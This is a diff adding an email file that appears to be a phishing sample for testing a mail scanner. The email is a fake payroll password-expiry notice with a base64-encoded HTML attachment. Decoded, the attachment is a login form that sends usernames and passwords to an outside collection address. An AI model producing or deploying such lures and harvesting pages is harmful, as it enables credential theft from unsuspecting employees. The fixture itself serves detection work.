@@ -1,0 +1,26 @@
+From: Payroll <payroll@hr-benefits-portal.org>
+To: recipient@example.org
+Subject: Your password expires today
+Date: Tue, 14 Nov 2023 22:13:20 -0000
+Message-ID: <case@mailscope.test>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============4963769554087851495=="
+
+--===============4963769554087851495==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Open the attached page to keep your password and access your pay slip.
+
+--===============4963769554087851495==
+Content-Type: text/html
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="PaySlip_Login.html"
+MIME-Version: 1.0
+
+PGh0bWw+PGJvZHk+PGZvcm0gYWN0aW9uPSJodHRwczovL2hyLWJlbmVmaXRzLXBvcnRhbC5vcmcv
+Y29sbGVjdCIgbWV0aG9kPSJwb3N0Ij48aW5wdXQgbmFtZT0idSI+PGlucHV0IHR5cGU9InBhc3N3
+b3JkIiBuYW1lPSJwIj48YnV0dG9uPlNpZ24gaW48L2J1dHRvbj48L2Zvcm0+PC9ib2R5PjwvaHRt
+bD4=
+
+--===============4963769554087851495==--
